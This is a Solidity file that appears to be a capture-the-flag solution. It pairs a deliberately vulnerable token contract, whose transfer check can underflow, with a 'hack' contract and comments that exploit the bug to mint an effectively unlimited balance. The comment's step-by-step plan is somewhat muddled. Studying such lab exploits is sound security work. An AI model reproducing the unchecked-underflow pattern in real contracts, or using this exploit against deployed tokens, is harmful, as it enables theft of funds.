// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
/*OVERFLOWS IN OLD SOLIDITY VERSIONS 
 previous solidity versions (prior or equal to 0.6.0) didn't use to throw compilation errors due to overflows/underflows
 this contract is an example of an underflow .
 require(balances[msg.sender] - _value >= 0); wouldn't revert if the _value is higher than alances[msg.sender] 
 because that would underflow and give a large number , which is positive !
 so here is the plan :
 1/ make a contract in which we send ourselves 1 token (through attack function ).
    This would make our balance 21 token .
    And it would make the contract's balance 0-1: which is the largest number a uint variable can hold (2^256 -1)
2/ in the console , we will send that 21 token to some random address using transfer function 
    We want our balance to be 0
3/We will call reTransfer function to transfer all that amount of tokens  to me again
    this way , we will dispose an infinite amount of tokens 

We will exploit this vulnerability

 */
contract hack {
    Token target = Token(0x985D323dfA61dA9adC7dCf0FB3F8de31469dF715);
  
    function attack() public {
      uint value = 1;
      require(target.balanceOf(address(this)) - value >= 0);
      target.transfer(msg.sender, 1);
    }
    function viewBalance() public view returns(uint) {
        return target.balanceOf(msg.sender);
    }
    function reTransfer() public {
      uint HackBalance = target.balanceOf(address(this));
      target.transfer(msg.sender, HackBalance);
    }

}

